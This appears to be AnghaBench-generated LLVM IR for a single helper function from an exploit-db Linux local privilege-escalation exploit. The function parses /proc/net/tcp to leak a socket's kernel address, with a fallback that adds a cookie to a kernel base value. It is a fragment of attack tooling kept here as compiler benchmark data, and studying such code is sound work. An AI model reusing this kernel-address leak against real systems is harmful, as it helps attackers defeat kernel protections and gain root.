; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_17391.c_get_sock_addr.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_17391.c_get_sock_addr.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@.str = private unnamed_addr constant [14 x i8] c"/proc/net/tcp\00", align 1
@.str.1 = private unnamed_addr constant [2 x i8] c"r\00", align 1
@.str.2 = private unnamed_addr constant [34 x i8] c"[*] Failed to open /proc/net/tcp\0A\00", align 1
@.str.3 = private unnamed_addr constant [92 x i8] c"%4d: %08X:%04X %08X:%04X %02X %08X:%08X %02X:%08lX %08X %5d %8d %lu %d %p %lu %lu %u %u %d\0A\00", align 1
@KERNEL_BASE = common dso_local global i64 0, align 8

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i64 @get_sock_addr(i32 %0) #0 {
  %2 = alloca i64, align 8
  %3 = alloca i32, align 4
  %4 = alloca i32*, align 8
  %5 = alloca [1024 x i8], align 16
  %6 = alloca [512 x i8], align 16
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i64, align 8
  %11 = alloca i64, align 8
  store i32 %0, i32* %3, align 4
  %12 = call i32* @fopen(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str, i64 0, i64 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.1, i64 0, i64 0))
  store i32* %12, i32** %4, align 8
  %13 = load i32*, i32** %4, align 8
  %14 = icmp ult i32* %13, null
  br i1 %14, label %15, label %17

15:                                               ; preds = %1
  %16 = call i32 @printf(i8* getelementptr inbounds ([34 x i8], [34 x i8]* @.str.2, i64 0, i64 0))
  store i64 0, i64* %2, align 8
  br label %48

17:                                               ; preds = %1
  br label %18

18:                                               ; preds = %44, %17
  %19 = getelementptr inbounds [1024 x i8], [1024 x i8]* %5, i64 0, i64 0
  %20 = load i32*, i32** %4, align 8
  %21 = call i64 @fgets(i8* %19, i32 1024, i32* %20)
  %22 = icmp ne i64 %21, 0
  br i1 %22, label %23, label %45

23:                                               ; preds = %18
  %24 = getelementptr inbounds [1024 x i8], [1024 x i8]* %5, i64 0, i64 0
  %25 = bitcast i64* %10 to i8**
  %26 = call i32 @sscanf(i8* %24, i8* getelementptr inbounds ([92 x i8], [92 x i8]* @.str.3, i64 0, i64 0), i32* %9, i32* %9, i32* %7, i32* %9, i32* %9, i32* %9, i32* %9, i32* %9, i32* %9, i64* %11, i32* %9, i32* %9, i32* %9, i64* %11, i32* %9, i8** %25, i64* %11, i64* %11, i32* %9, i32* %9, i32* %9)
  %27 = load i32, i32* %7, align 4
  %28 = load i32, i32* %3, align 4
  %29 = icmp eq i32 %27, %28
  br i1 %29, label %30, label %44

30:                                               ; preds = %23
  %31 = load i64, i64* %10, align 8
  %32 = icmp ne i64 %31, 0
  br i1 %32, label %40, label %33

33:                                               ; preds = %30
  %34 = load i32, i32* %3, align 4
  %35 = call i32 @get_cookie(i32 %34)
  store i32 %35, i32* %8, align 4
  %36 = load i32, i32* %8, align 4
  %37 = zext i32 %36 to i64
  %38 = load i64, i64* @KERNEL_BASE, align 8
  %39 = add i64 %37, %38
  store i64 %39, i64* %10, align 8
  br label %40

40:                                               ; preds = %33, %30
  %41 = load i32*, i32** %4, align 8
  %42 = call i32 @fclose(i32* %41)
  %43 = load i64, i64* %10, align 8
  store i64 %43, i64* %2, align 8
  br label %48

44:                                               ; preds = %23
  br label %18

45:                                               ; preds = %18
  %46 = load i32*, i32** %4, align 8
  %47 = call i32 @fclose(i32* %46)
  store i64 0, i64* %2, align 8
  br label %48

48:                                               ; preds = %45, %40, %15
  %49 = load i64, i64* %2, align 8
  ret i64 %49
}

declare dso_local i32* @fopen(i8*, i8*) #1

declare dso_local i32 @printf(i8*) #1

declare dso_local i64 @fgets(i8*, i32, i32*) #1

declare dso_local i32 @sscanf(i8*, i8*, i32*, i32*, i32*, i32*, i32*, i32*, i32*, i32*, i32*, i64*, i32*, i32*, i32*, i64*, i32*, i8**, i64*, i64*, i32*, i32*, i32*) #1

declare dso_local i32 @get_cookie(i32) #1

declare dso_local i32 @fclose(i32*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
